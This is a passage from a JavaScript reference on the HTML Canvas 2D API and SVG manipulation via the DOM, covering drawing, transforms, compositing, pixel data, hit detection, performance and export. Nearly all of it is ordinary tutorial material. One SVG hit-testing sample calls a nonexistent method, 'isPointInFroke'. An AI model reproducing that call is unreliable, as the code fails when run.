ctx.setLineDash([10, 5]); // Dash pattern: 10px line, 5px gap
ctx.lineDashOffset = 0; // Offset for dash pattern
```

### Text Rendering

```javascript
ctx.font = '48px serif';
ctx.fillStyle = '#000000';
ctx.fillText('Hello Canvas', 50, 100);

// Stroke text (outline)
ctx.strokeStyle = '#ff0000';
ctx.lineWidth = 2;
ctx.strokeText('Outline Text', 50, 200);

// Text alignment
ctx.textAlign = 'start'; // 'start', 'end', 'left', 'right', 'center'
ctx.textBaseline = 'alphabetic'; // 'top', 'hanging', 'middle', 'alphabetic', 'ideographic', 'bottom'

// Measure text dimensions
const metrics = ctx.measureText('Hello Canvas');
console.log(metrics.width); // Pixel width of text
console.log(metrics.actualBoundingBoxAscent); // Distance above baseline
console.log(metrics.actualBoundingBoxDescent); // Distance below baseline
```

### Image Drawing

#### Drawing Images

```javascript
const img = new Image();
img.onload = () => {
  // Draw entire image
  ctx.drawImage(img, 0, 0);
  
  // Draw with scaling
  ctx.drawImage(img, 0, 0, 400, 300);
  
  // Draw portion of image (sprite sheet slicing)
  // drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)
  ctx.drawImage(img, 32, 0, 32, 32, 100, 100, 64, 64);
};
img.src = 'image.png';
```

The nine-parameter version extracts a rectangle from the source image and draws it scaled to the destination rectangle.

#### Image Smoothing

```javascript
ctx.imageSmoothingEnabled = true;
ctx.imageSmoothingQuality = 'high'; // 'low', 'medium', 'high'
```

Disabling smoothing produces crisp pixel art when scaling images.

### Transformations

Transformations modify the coordinate system, affecting all subsequent drawing operations:

```javascript
// Translation
ctx.translate(100, 100); // Move origin to (100, 100)

// Rotation (radians)
ctx.rotate(Math.PI / 4); // Rotate 45 degrees

// Scaling
ctx.scale(2, 0.5); // Scale 2x horizontally, 0.5x vertically

// Shearing/Skewing with transform matrix
ctx.transform(1, 0.5, 0, 1, 0, 0); // Horizontal skew
```

Transformations accumulate. Each transformation applies relative to the current transformation state.

#### Transformation Matrix

The `setTransform` and `transform` methods use a 2D transformation matrix:

```javascript
// setTransform replaces current matrix
ctx.setTransform(a, b, c, d, e, f);

// transform multiplies with current matrix
ctx.transform(a, b, c, d, e, f);
```

Matrix parameters:

- `a`: Horizontal scaling
- `b`: Vertical skewing
- `c`: Horizontal skewing
- `d`: Vertical scaling
- `e`: Horizontal translation
- `f`: Vertical translation

```javascript
// Reset to identity matrix
ctx.setTransform(1, 0, 0, 1, 0, 0);

// Or use resetTransform (modern browsers)
ctx.resetTransform();
```

#### State Stack

```javascript
ctx.save(); // Push current state onto stack

ctx.translate(100, 100);
ctx.rotate(Math.PI / 4);
ctx.fillStyle = '#ff0000';
// ... drawing operations with transformed state

ctx.restore(); // Pop state from stack, reverting transformations and styles
```

The state stack preserves:

- Transformation matrix
- Clipping region
- Stroke and fill styles
- Line width, cap, join, dash pattern
- Text styling
- Global alpha and composite operation
- Shadow properties

### Compositing and Blending

#### Global Alpha

```javascript
ctx.globalAlpha = 0.5; // 0.0 (transparent) to 1.0 (opaque)
ctx.fillRect(50, 50, 100, 100); // Drawn at 50% opacity
```

#### Global Composite Operation

Controls how new shapes blend with existing canvas content:

```javascript
ctx.globalCompositeOperation = 'source-over'; // Default
```

Common operations:

- `source-over`: New content drawn over existing (default)
- `source-in`: New content only where it overlaps existing
- `source-out`: New content only where it doesn't overlap existing
- `source-atop`: New content drawn only where it overlaps existing
- `destination-over`: Existing content drawn over new
- `destination-in`: Existing content kept only where new content drawn
- `destination-out`: Existing content removed where new content drawn
- `destination-atop`: Existing content kept only where it overlaps new
- `lighter`: Colors added together
- `copy`: Only new content shown
- `xor`: Existing XOR new content
- `multiply`: Multiply color values
- `screen`: Invert, multiply, invert again
- `overlay`: Combination of multiply and screen
- `darken`: Keep darker of two colors
- `lighten`: Keep lighter of two colors

### Clipping

Clipping restricts drawing to a defined region:

```javascript
ctx.save();

// Define clipping path
ctx.beginPath();
ctx.arc(250, 250, 100, 0, Math.PI * 2);
ctx.clip();

// Only visible within clipping region
ctx.fillStyle = '#ff0000';
ctx.fillRect(0, 0, 500, 500);

ctx.restore(); // Remove clipping region
```

Multiple `clip()` calls intersect clipping regions. The clipping region cannot be expanded without restoring to a previous state.

#### Non-zero and Even-odd Fill Rules

```javascript
ctx.clip('nonzero'); // Default
ctx.clip('evenodd'); // Alternating inside/outside
```

The fill rule determines whether a point is inside the path for complex paths with self-intersections.

### Pixel Manipulation

#### Reading Pixel Data

```javascript
const imageData = ctx.getImageData(x, y, width, height);
const pixels = imageData.data; // Uint8ClampedArray

// Pixels stored as [r, g, b, a, r, g, b, a, ...]
for (let i = 0; i < pixels.length; i += 4) {
  const r = pixels[i];
  const g = pixels[i + 1];
  const b = pixels[i + 2];
  const a = pixels[i + 3];
  
  // Modify pixels
  pixels[i] = 255 - r; // Invert red channel
}
```

Each pixel occupies four consecutive array elements (RGBA), with values 0-255.

#### Writing Pixel Data

```javascript
ctx.putImageData(imageData, x, y);

// With dirty rectangle (only update portion)
ctx.putImageData(imageData, x, y, dirtyX, dirtyY, dirtyWidth, dirtyHeight);
```

#### Creating ImageData

```javascript
// Create blank ImageData
const imageData = ctx.createImageData(width, height);

// Create from existing ImageData
const newImageData = ctx.createImageData(existingImageData);
```

#### Performance Considerations for Pixel Manipulation

`getImageData` and `putImageData` are expensive operations:

- Force GPU-to-CPU synchronization in accelerated contexts
- Process potentially millions of pixels
- Block the main thread

For real-time effects, minimize calls and operate on smaller regions when possible.

### Gradients and Patterns

#### Linear Gradients

```javascript
const gradient = ctx.createLinearGradient(x0, y0, x1, y1);
gradient.addColorStop(0, '#ff0000');
gradient.addColorStop(0.5, '#00ff00');
gradient.addColorStop(1, '#0000ff');

ctx.fillStyle = gradient;
ctx.fillRect(0, 0, 400, 300);
```

The gradient runs from point (x0, y0) to point (x1, y1). Color stops define interpolation points between 0.0 and 1.0.

#### Radial Gradients

```javascript
const gradient = ctx.createRadialGradient(x0, y0, r0, x1, y1, r1);
gradient.addColorStop(0, '#ffffff');
gradient.addColorStop(1, '#000000');

ctx.fillStyle = gradient;
ctx.fillRect(0, 0, 400, 300);
```

Defines gradient between two circles. The gradient interpolates from the first circle (x0, y0, radius r0) to the second circle (x1, y1, radius r1).

#### Conic Gradients

```javascript
const gradient = ctx.createConicGradient(startAngle, x, y);
gradient.addColorStop(0, '#ff0000');
gradient.addColorStop(0.25, '#ffff00');
gradient.addColorStop(0.5, '#00ff00');
gradient.addColorStop(0.75, '#0000ff');
gradient.addColorStop(1, '#ff0000');

ctx.fillStyle = gradient;
ctx.fillRect(0, 0, 400, 300);
```

Creates gradient rotating around a center point, starting at the specified angle (in radians).

#### Patterns

```javascript
const img = new Image();
img.onload = () => {
  const pattern = ctx.createPattern(img, 'repeat');
  // Repeat options: 'repeat', 'repeat-x', 'repeat-y', 'no-repeat'
  
  ctx.fillStyle = pattern;
  ctx.fillRect(0, 0, 400, 300);
};
img.src = 'pattern.png';

// Pattern from canvas
const patternCanvas = document.createElement('canvas');
patternCanvas.width = 20;
patternCanvas.height = 20;
const patternCtx = patternCanvas.getContext('2d');
patternCtx.fillStyle = '#ff0000';
patternCtx.fillRect(0, 0, 10, 10);
const pattern = ctx.createPattern(patternCanvas, 'repeat');
```

Patterns can be created from `Image`, `Canvas`, or `Video` elements.

### Shadows

```javascript
ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
ctx.shadowBlur = 10; // Blur radius in pixels
ctx.shadowOffsetX = 5;
ctx.shadowOffsetY = 5;

ctx.fillStyle = '#ff0000';
ctx.fillRect(50, 50, 100, 100);

// Disable shadows
ctx.shadowColor = 'transparent';
// Or
ctx.shadowBlur = 0;
```

Shadows apply to all drawing operations (shapes, text, images). [Inference: Large blur values may impact performance as they require more computation per drawn pixel.]

### Clearing and Erasing

```javascript
// Clear entire canvas
ctx.clearRect(0, 0, canvas.width, canvas.height);

// Clear specific rectangle
ctx.clearRect(x, y, width, height);

// Erase by drawing with destination-out composite
ctx.globalCompositeOperation = 'destination-out';
ctx.fillRect(x, y, width, height);
ctx.globalCompositeOperation = 'source-over'; // Reset
```

### Hit Detection

Canvas doesn't provide built-in hit detection. Common approaches:

#### Mathematical Hit Detection

```javascript
function isPointInRect(x, y, rect) {
  return x >= rect.x && x <= rect.x + rect.width &&
         y >= rect.y && y <= rect.y + rect.height;
}

canvas.addEventListener('click', (e) => {
  const rect = canvas.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;
  
  if (isPointInRect(x, y, myRect)) {
    // Handle click
  }
});
```

#### Path-based Hit Detection

```javascript
ctx.beginPath();
ctx.arc(150, 150, 50, 0, Math.PI * 2);

canvas.addEventListener('click', (e) => {
  const rect = canvas.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;
  
  if (ctx.isPointInPath(x, y)) {
    // Point is inside the path
  }
  
  if (ctx.isPointInStroke(x, y)) {
    // Point is on the stroke
  }
});
```

These methods test against the current path or a provided Path2D object.

#### Off-screen Color Mapping

```javascript
// Draw objects with unique colors on hidden canvas
const hitCanvas = document.createElement('canvas');
const hitCtx = hitCanvas.getContext('2d');
hitCanvas.width = canvas.width;
hitCanvas.height = canvas.height;

const objectColors = new Map();
objects.forEach((obj, index) => {
  const color = `rgb(${index}, 0, 0)`;
  objectColors.set(color, obj);
  hitCtx.fillStyle = color;
  hitCtx.fillRect(obj.x, obj.y, obj.width, obj.height);
});

canvas.addEventListener('click', (e) => {
  const rect = canvas.getBoundingClientRect();
  const x = e.clientX - rect.left;
  const y = e.clientY - rect.top;
  
  const pixel = hitCtx.getImageData(x, y, 1, 1).data;
  const color = `rgb(${pixel[0]}, ${pixel[1]}, ${pixel[2]})`;
  const hitObject = objectColors.get(color);
});
```

### Path2D Objects

Path2D creates reusable path objects:

```javascript
const circle = new Path2D();
circle.arc(100, 100, 50, 0, Math.PI * 2);

const rect = new Path2D();
rect.rect(200, 200, 100, 100);

ctx.stroke(circle);
ctx.fill(rect);

// SVG path data
const heart = new Path2D('M10 10 L20 20 L30 10 Z');
ctx.fill(heart);

// Combining paths
const combined = new Path2D();
combined.addPath(circle);
combined.addPath(rect);
ctx.stroke(combined);

// Hit detection
if (ctx.isPointInPath(circle, x, y)) {
  // Point inside circle
}
```

### Animation Techniques

#### RequestAnimationFrame Loop

```javascript
let lastTime = 0;

function animate(currentTime) {
  const deltaTime = currentTime - lastTime;
  lastTime = currentTime;
  
  // Clear canvas
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  
  // Update state
  updateObjects(deltaTime);
  
  // Draw frame
  drawObjects();
  
  requestAnimationFrame(animate);
}

requestAnimationFrame(animate);
```

`requestAnimationFrame` synchronizes with the browser's repaint cycle (typically 60fps) and pauses when the tab is inactive.

#### Double Buffering

Canvas automatically double-buffers drawing operations. All commands execute on an off-screen buffer, then the result displays atomically. Explicit double buffering using multiple canvases is unnecessary unless creating complex layered effects.

#### Dirty Rectangle Optimization

```javascript
const dirtyRects = [];

function markDirty(x, y, width, height) {
  dirtyRects.push({ x, y, width, height });
}

function draw() {
  dirtyRects.forEach(rect => {
    ctx.clearRect(rect.x, rect.y, rect.width, rect.height);
    drawObjectsInRegion(rect);
  });
  dirtyRects.length = 0;
}
```

Only redraw portions of the canvas that changed, reducing pixel processing for large canvases.

#### Layering Multiple Canvases

```javascript
<div style="position: relative;">
  <canvas id="background" style="position: absolute; z-index: 0;"></canvas>
  <canvas id="midground" style="position: absolute; z-index: 1;"></canvas>
  <canvas id="foreground" style="position: absolute; z-index: 2;"></canvas>
</div>
```

Separate static and dynamic content across layers. Only animate canvases containing moving elements, leaving static layers unchanged.

### Performance Optimization

#### Minimize State Changes

```javascript
// Inefficient - multiple state changes
objects.forEach(obj => {
  ctx.fillStyle = obj.color;
  ctx.fillRect(obj.x, obj.y, obj.width, obj.height);
});

// Efficient - batch by state
const objectsByColor = groupBy(objects, 'color');
Object.entries(objectsByColor).forEach(([color, objs]) => {
  ctx.fillStyle = color;
  objs.forEach(obj => {
    ctx.fillRect(obj.x, obj.y, obj.width, obj.height);
  });
});
```

Context state changes are expensive. Batch operations requiring the same state.

#### Pre-render Complex Shapes

```javascript
// Create off-screen canvas for complex shape
const shapeCanvas = document.createElement('canvas');
const shapeCtx = shapeCanvas.getContext('2d');
shapeCanvas.width = 100;
shapeCanvas.height = 100;

// Draw complex shape once
drawComplexShape(shapeCtx);

// Reuse in main canvas
function draw() {
  for (let i = 0; i < 100; i++) {
    ctx.drawImage(shapeCanvas, x[i], y[i]);
  }
}
```

#### Avoid Unnecessary Clears

```javascript
// Only clear changed regions
ctx.clearRect(prevX, prevY, width, height);

// Or use fillRect with background color
ctx.fillStyle = '#ffffff';
ctx.fillRect(0, 0, canvas.width, canvas.height);
```

Full canvas clears process every pixel. Clearing only necessary regions reduces work.

#### Integer Coordinates

```javascript
// Causes antialiasing, slower rendering
ctx.fillRect(10.5, 10.5, 100, 100);

// Crisp, faster rendering
ctx.fillRect(10, 10, 100, 100);
```

Non-integer coordinates trigger subpixel rendering and antialiasing.

#### Reduce Shadow Complexity

Shadows are expensive:

```javascript
// Cache shadowed content
const shadowCanvas = document.createElement('canvas');
const shadowCtx = shadowCanvas.getContext('2d');
shadowCtx.shadowColor = 'rgba(0, 0, 0, 0.5)';
shadowCtx.shadowBlur = 10;
drawShape(shadowCtx);

// Draw cached version
ctx.drawImage(shadowCanvas, x, y);
```

### Canvas Security and Tainting

Canvases become "tainted" when drawing cross-origin images without CORS headers:

```javascript
const img = new Image();
img.crossOrigin = 'anonymous'; // Request CORS
img.src = 'https://example.com/image.png';

img.onload = () => {
  ctx.drawImage(img, 0, 0);
  
  // This will throw SecurityError if image is tainted
  const imageData = ctx.getImageData(0, 0, 100, 100);
};
```

Tainted canvases prevent:

- `getImageData()`
- `toDataURL()`
- `toBlob()`

The entire canvas becomes tainted if any tainted content is drawn to it.

### Canvas to Image Export

```javascript
// Data URL
const dataURL = canvas.toDataURL('image/png');
const img = new Image();
img.src = dataURL;

// Specify quality for JPEG/WEBP (0.0 to 1.0)
const jpegURL = canvas.toDataURL('image/jpeg', 0.8);

// Blob (asynchronous, more efficient)
canvas.toBlob((blob) => {
  const url = URL.createObjectURL(blob);
  const img = new Image();
  img.src = url;
  
  // Clean up
  URL.revokeObjectURL(url);
}, 'image/png');

// Download
canvas.toBlob((blob) => {
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'canvas-image.png';
  a.click();
  URL.revokeObjectURL(url);
});
```

### OffscreenCanvas

OffscreenCanvas enables canvas rendering in Web Workers:

```javascript
// Main thread
const offscreen = canvas.transferControlToOffscreen();
const worker = new Worker('canvas-worker.js');
worker.postMessage({ canvas: offscreen }, [offscreen]);

// canvas-worker.js
self.onmessage = (e) => {
  const canvas = e.data.canvas;
  const ctx = canvas.getContext('2d');
  
  function draw() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    // Drawing operations
    requestAnimationFrame(draw);
  }
  
  requestAnimationFrame(draw);
};
```

This offloads rendering to a separate thread, keeping the main thread responsive. [Inference: Support varies across browsers; feature detection recommended.]

### Canvas Memory Considerations

Large canvases consume significant memory:

```javascript
// Memory usage (approximate)
const bytesPerPixel = 4; // RGBA
const memoryUsage = canvas.width * canvas.height * bytesPerPixel;

// 4K canvas: 3840 × 2160 × 4 = 33,177,600 bytes (~31.6 MB)
```

Multiple large canvases or frequent canvas creation can exhaust available memory, particularly on mobile devices. Reuse canvases when possible and limit maximum dimensions based on device capabilities.

### Canvas Context Attributes

```javascript
const ctx = canvas.getContext('2d', {
  alpha: false, // Disable alpha channel for performance
  desynchronized: true, // Reduce latency (may cause tearing)
  willReadFrequently: true // Optimize for frequent getImageData calls
});
```

These attributes must be set during context creation and cannot be changed afterward. [Unverified: Browser support and actual performance impact of these attributes varies.]

---

## SVG Manipulation via DOM

SVG elements in the DOM are represented as specialized node types that inherit from both general DOM interfaces and SVG-specific interfaces. These elements can be manipulated through standard DOM methods while also exposing SVG-specific properties and methods that handle the unique requirements of vector graphics.

### SVG DOM Namespace

SVG elements exist in the SVG namespace (`http://www.w3.org/2000/svg`). Creating SVG elements requires namespace-aware methods:

```javascript
const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
```

Using `document.createElement('svg')` creates an `HTMLUnknownElement` rather than an `SVGSVGElement`, resulting in elements that don't render or behave correctly. This namespace requirement extends to all SVG elements—`rect`, `path`, `g`, etc.

The namespace constant is commonly stored: `const SVG_NS = 'http://www.w3.org/2000/svg'` to avoid repetition.

### Attribute vs. Property Access

SVG elements expose attributes through multiple access patterns, each with different behavior:

**`setAttribute`/`getAttribute`**: Standard DOM methods that work with string values. All attributes can be set this way:

```javascript
circle.setAttribute('cx', '50');
circle.setAttribute('r', '25');
```

**Direct property access**: Some SVG attributes map to properties, but behavior varies. Properties like `className` on SVG elements return `SVGAnimatedString` objects rather than strings:

```javascript
circle.className.baseVal = 'my-class'; // Not circle.className = 'my-class'
```

**Presentation attributes vs. CSS properties**: Many SVG visual properties (`fill`, `stroke`, `opacity`) can be set as attributes or via CSS. CSS rules take precedence over presentation attributes. Setting `element.style.fill` differs from `element.setAttribute('fill', ...)` in specificity and cascade behavior.

### SVG-Specific Interfaces

Elements implement interfaces that provide specialized properties and methods:

**`SVGGeometryElement`**: Base for shape elements (`circle`, `rect`, `ellipse`, `line`, `polyline`, `polygon`, `path`). Provides methods like `getTotalLength()` and `getPointAtLength(distance)`.

**`SVGGraphicsElement`**: Base for elements that render graphics. Provides `getBBox()`, `getCTM()`, `getScreenCTM()` for bounding box and transformation matrix access.

**`SVGSVGElement`**: The root `<svg>` element. Provides viewport methods like `createSVGPoint()`, `createSVGMatrix()`, and `createSVGTransform()`.

### Coordinate System Manipulation

SVG uses nested coordinate systems with transformations. The DOM provides interfaces to work with these:

**`SVGPoint`**: Represents a point in coordinate space. Created via `svg.createSVGPoint()`:

```javascript
const pt = svg.createSVGPoint();
pt.x = 100;
pt.y = 200;
```

**Coordinate transformation**: Converting between coordinate spaces requires transformation matrices. The `getScreenCTM()` method returns the transformation from element space to screen space:

```javascript
const screenPt = {x: event.clientX, y: event.clientY};
const svg = element.ownerSVGElement;
const pt = svg.createSVGPoint();
pt.x = screenPt.x;
pt.y = screenPt.y;
const transformed = pt.matrixTransform(svg.getScreenCTM().inverse());
// transformed now contains SVG coordinates
```

This pattern is essential for mapping mouse/touch events (in screen coordinates) to SVG element coordinates, especially when the SVG has transforms, viewBox, or is scaled.

**`getBBox()`**: Returns the bounding box in element's local coordinate system before any transforms are applied. Returns an `SVGRect` with `x`, `y`, `width`, `height` properties.

**`getBoundingClientRect()`**: Returns the bounding box in screen coordinates after all transforms. Same interface as for HTML elements.

### Transform Manipulation

The `transform` attribute contains a list of transformations. DOM access is through `SVGAnimatedTransformList`:

```javascript
const transformList = element.transform.baseVal;
```

**Creating transforms**: The root SVG element provides factory methods:

```javascript
const svg = element.ownerSVGElement;
const translate = svg.createSVGTransform();
translate.setTranslate(50, 100);
transformList.appendItem(translate);

const rotate = svg.createSVGTransform();
rotate.setRotate(45, 0, 0); // angle, centerX, centerY
transformList.appendItem(rotate);
```

**Transform consolidation**: Multiple transforms can be consolidated into a single matrix:

```javascript
const matrix = transformList.consolidate().matrix;
```

The resulting matrix can be decomposed or used for calculations. This is useful when you need to determine the cumulative effect of multiple transforms.

**Direct matrix manipulation**: For complex transformations, working directly with matrices may be clearer:

```javascript
const matrix = svg.createSVGMatrix();
matrix.a = 1; // scale X
matrix.b = 0; // skew Y
matrix.c = 0; // skew X
matrix.d = 1; // scale Y
matrix.e = 50; // translate X
matrix.f = 100; // translate Y

const transform = svg.createSVGTransform();
transform.setMatrix(matrix);
element.transform.baseVal.initialize(transform);
```

### Path Manipulation

Path elements use a specialized interface for their `d` attribute:

**`SVGPathElement.pathSegList`** (deprecated in SVG2, but still relevant in some contexts): Provided structured access to path segments. Modern approach uses `setAttribute` with path string manipulation or path construction libraries.

**Path data construction**: Building paths programmatically:

```javascript
const commands = [];
commands.push(`M ${x} ${y}`); // moveto
commands.push(`L ${x2} ${y2}`); // lineto
commands.push(`Q ${cx} ${cy} ${x3} ${y3}`); // quadratic curve
commands.push('Z'); // closepath
path.setAttribute('d', commands.join(' '));
```

**Path measurement**: `SVGGeometryElement` methods enable path analysis:

```javascript
const length = path.getTotalLength();
const midpoint = path.getPointAtLength(length / 2);
// midpoint is SVGPoint with x, y coordinates
```

This is particularly useful for animations along paths or for placing elements at specific path positions.

**Hit testing**: `isPointInFill()` and `isPointInStroke()` determine if a point is inside the element:

```javascript
const pt = svg.createSVGPoint();
pt.x = mouseX;
pt.y = mouseY;
const isInside = path.isPointInFroke(pt);
```

These methods respect the element's coordinate system and transformations.

### ViewBox and Viewport Manipulation

The `viewBox` attribute defines the SVG coordinate system. Manipulating it programmatically:

```javascript
const viewBox = svg.viewBox.baseVal;
viewBox.x = 0;
viewBox.y = 0;
viewBox.width = 500;
viewBox.height = 500;
```

Or as a string attribute:

```javascript
svg.setAttribute('viewBox', '0 0 500 500');
```

**Calculating viewBox from content**: To frame all content, calculate bounding box of all children:

```javascript
let minX = Infinity, minY = Infinity;
let maxX = -Infinity, maxY = -Infinity;

Array.from(svg.children).forEach(child => {
  const bbox = child.getBBox();
  minX = Math.min(minX, bbox.x);
  minY = Math.min(minY, bbox.y);
  maxX = Math.max(maxX, bbox.x + bbox.width);
  maxY = Math.max(maxY, bbox.y + bbox.height);
});

svg.setAttribute('viewBox', `${minX} ${minY} ${maxX - minX} ${maxY - minY}`);
```

**`preserveAspectRatio`**: Controls how the viewBox scales and aligns within the viewport. Values like `xMidYMid meet` (default) maintain aspect ratio and center the content. Accessible via:

```javascript
const par = svg.preserveAspectRatio.baseVal;
par.align = SVGPreserveAspectRatio.SVG_PRESERVEASPECTRATIO_XMIDYMID;
par.meetOrSlice = SVGPreserveAspectRatio.SVG_MEETORSLICE_MEET;
```

### Cloning and Templates

**Deep cloning**: `cloneNode(true)` creates a deep copy with all attributes and children. Cloned SVG elements maintain their structure and styling:

```javascript
const original = document.getElementById('template-shape');
const clone = original.cloneNode(true);
clone.setAttribute('id', 'new-shape');
svg.appendChild(clone);
```

**`<use>` element**: References other SVG elements by ID, creating instances without actual cloning in the DOM:

```javascript
const use = document.createElementNS(SVG_NS, 'use');
use.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#my-symbol');
use.setAttribute('x', '100');
use.setAttribute('y', '100');
```

The `xlink:href` attribute requires the XLink namespace. Modern SVG also supports just `href` without namespace.

**Shadow DOM of `<use>`**: The referenced content appears in a shadow tree. Direct manipulation of the instance requires accessing this shadow tree, which has limited DOM access. Instead, modify the original element or override via CSS.

### Dynamic Element Creation Patterns

**Fragment assembly**: For multiple elements, use DocumentFragment to minimize reflows:

```javascript
const fragment = document.createDocumentFragment();
data.forEach(item => {
  const circle = document.createElementNS(SVG_NS, 'circle');
  circle.setAttribute('cx', item.x);
  circle.setAttribute('cy', item.y);
  circle.setAttribute('r', item.r);
  fragment.appendChild(circle);
});
svg.appendChild(fragment);
```

**Template strings**: For complex structures, constructing HTML strings can be more readable:

```javascript
const svgString = `
  <g class="group">
    <rect x="0" y="0" width="100" height="100" fill="blue"/>
    <text x="50" y="50" text-anchor="middle">Label</text>
  </g>
`;
const temp = document.createElementNS(SVG_NS, 'g');
temp.innerHTML = svgString;
svg.appendChild(temp.firstElementChild);
```

Note that `innerHTML` on SVG elements correctly parses SVG markup (assuming the parent is already in SVG context).

### Text Element Manipulation

Text in SVG has unique positioning requirements:

**`<text>` element**: Basic text positioning:

```javascript
const text = document.createElementNS(SVG_NS, 'text');
text.setAttribute('x', '100');
text.setAttribute('y', '100');
text.textContent = 'Hello';
```

**`<tspan>` for spans**: Individual text spans within a text element:

```javascript
const tspan = document.createElementNS(SVG_NS, 'tspan');
tspan.setAttribute('x', '100');
tspan.setAttribute('dy', '20'); // relative vertical offset
tspan.textContent = 'Line 2';
text.appendChild(tspan);
```

**Text measurement**: Get rendered text dimensions:

```javascript
const bbox = text.getBBox();
const width = bbox.width;
const height = bbox.height;
```

This requires the element to be in the document and rendered. Measuring detached elements returns zero dimensions.

**`textLength` and `lengthAdjust`**: Control text fitting:

```javascript
text.setAttribute('textLength', '200');
text.setAttribute('lengthAdjust', 'spacingAndGlyphs');
```

This scales or spaces the text to fit the specified length.

**`getComputedTextLength()`**: Returns the actual rendered length:

```javascript
const length = text.getComputedTextLength();
```

**Text on path**: Text can follow a path using `<textPath>`:

```javascript
const textPath = document.createElementNS(SVG_NS, 'textPath');
textPath.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#myPath');
textPath.textContent = 'Text along curve';
text.appendChild(textPath);
```

### Event Handling Specifics

SVG elements support standard DOM events with some considerations:

**Mouse coordinate mapping**: Event coordinates are in screen space. Converting to SVG space requires transformation (as shown in coordinate system section).

**Pointer events**: The `pointer-events` attribute controls hit testing. Values like `none`, `fill`, `stroke`, `all` determine what parts of an element respond to pointer events:

```javascript
element.setAttribute('pointer-events', 'none'); // makes element non-interactive
```

**Event delegation**: Like HTML, events bubble up the SVG tree. Attaching listeners to the root SVG or group elements can handle events from many children:

```javascript
svg.addEventListener('click', (event) => {
  if (event.target.tagName === 'circle') {
    // handle circle click
  }
});
```

**Preventing default**: Some SVG interactions (like dragging) may trigger unwanted browser behaviors. Prevent with `event.preventDefault()` as with HTML.

### CSS and Styling

SVG elements can be styled via CSS with caveats:

**Presentation attributes vs. CSS properties**: Attributes like `fill` and `stroke` are also CSS properties. CSS declarations override attribute values:

```javascript
circle.setAttribute('fill', 'red');
circle.style.fill = 'blue'; // blue wins
```

**Classes and ID selection**: Standard class and ID manipulation:

```javascript
element.classList.add('highlighted');
element.classList.toggle('active');
```

**Computed styles**: `getComputedStyle()` works on SVG elements:

```javascript
const style = getComputedStyle(element);
const fill = style.fill; // returns computed color value
```

**Custom properties**: CSS variables work in SVG:

```javascript
svg.style.setProperty('--primary-color', '#ff0000');
// then use in attributes or CSS: fill="var(--primary-color)"
```

### Marker Manipulation

Markers (arrowheads, endpoints) are defined once and referenced:

**Defining markers**:

```javascript
const marker = document.createElementNS(SVG_NS, 'marker');
marker.setAttribute('id', 'arrow');
marker.setAttribute('markerWidth', '10');
marker.setAttribute('markerHeight', '10');
marker.setAttribute('refX', '5');
marker.setAttribute('refY', '5');
marker.setAttribute('orient', 'auto');

const path = document.createElementNS(SVG_NS, 'path');
path.setAttribute('d', 'M 0 0 L 10 5 L 0 10 Z');
marker.appendChild(path);

defs.appendChild(marker);
```

**Applying markers**:

```javascript
line.setAttribute('marker-end', 'url(#arrow)');
```

Markers automatically orient themselves along the path direction when `orient="auto"`.

### Filter Manipulation

SVG filters enable complex visual effects. Building filters programmatically:

```javascript
const filter = document.createElementNS(SVG_NS, 'filter');
filter.setAttribute('id', 'blur');

const feGaussianBlur = document.createElementNS(SVG_NS, 'feGaussianBlur');
feGaussianBlur.setAttribute('in', 'SourceGraphic');
feGaussianBlur.setAttribute('stdDeviation', '5');
filter.appendChild(feGaussianBlur);

defs.appendChild(filter);

element.setAttribute('filter', 'url(#blur)');
```

**Filter chaining**: Multiple filter primitives process sequentially:

```javascript
const feOffset = document.createElementNS(SVG_NS, 'feOffset');
feOffset.setAttribute('in', 'SourceAlpha');
feOffset.setAttribute('dx', '3');
feOffset.setAttribute('dy', '3');
feOffset.setAttribute('result', 'offsetBlur');

const feBlur = document.createElementNS(SVG_NS, 'feGaussianBlur');
feBlur.setAttribute('in', 'offsetBlur');
feBlur.setAttribute('stdDeviation', '2');
feBlur.setAttribute('result', 'blurredOffset');

// combine with original using feMerge...
```

The `in` and `result` attributes connect filter stages, creating a processing pipeline.

### Gradient Manipulation

Linear and radial gradients require structured element trees:

**Linear gradient**:

```javascript
const gradient = document.createElementNS(SVG_NS, 'linearGradient');
gradient.setAttribute('id', 'grad1');
gradient.setAttribute('x1', '0%');
gradient.setAttribute('y1', '0%');
gradient.setAttribute('x2', '100%');
gradient.setAttribute('y2', '0%');

const stop1 = document.createElementNS(SVG_NS, 'stop');
stop1.setAttribute('offset', '0%');
stop1.setAttribute('stop-color', 'red');

const stop2 = document.createElementNS(SVG_NS, 'stop');
stop2.setAttribute('offset', '100%');
stop2.setAttribute('stop-color', 'blue');

gradient.appendChild(stop1);
gradient.appendChild(stop2);
defs.appendChild(gradient);

rect.setAttribute('fill', 'url(#grad1)');
```

**Dynamic gradient updates**: Changing stop positions or colors:

```javascript
const stops = gradient.querySelectorAll('stop');
stops[0].setAttribute('stop-color', 'green');
stops[1].setAttribute('offset', '80%');
```

Changes take effect immediately as the gradient is referenced, not copied.

### Symbol and Defs Management

The `<defs>` element contains reusable definitions:

```javascript
const defs = document.createElementNS(SVG_NS, 'defs');
svg.appendChild(defs);
```

**Symbols**: Define reusable graphics with their own viewBox:

```javascript
const symbol = document.createElementNS(SVG_NS, 'symbol');
symbol.setAttribute('id', 'icon');
symbol.setAttribute('viewBox', '0 0 20 20');
// add shapes to symbol
defs.appendChild(symbol);
```

Symbols don't render directly—they're instantiated via `<use>` elements.

### Animation via DOM

While CSS animations and SMIL are options, animating via DOM manipulation provides maximum control:

**RequestAnimationFrame pattern**:

```javascript
let angle = 0;
function animate() {
  angle += 1;
  element.setAttribute('transform', `rotate(${angle} 50 50)`);
  requestAnimationFrame(animate);
}
animate();
```

**Performance considerations**: Modifying attributes triggers recalculation and repaint. Transform changes are generally more performant than position changes:

```javascript
// Better: transform-based animation
element.style.transform = `translate(${x}px, ${y}px)`;

// Less performant: attribute-based positioning
element.setAttribute('x', x);
element.setAttribute('y', y);
```

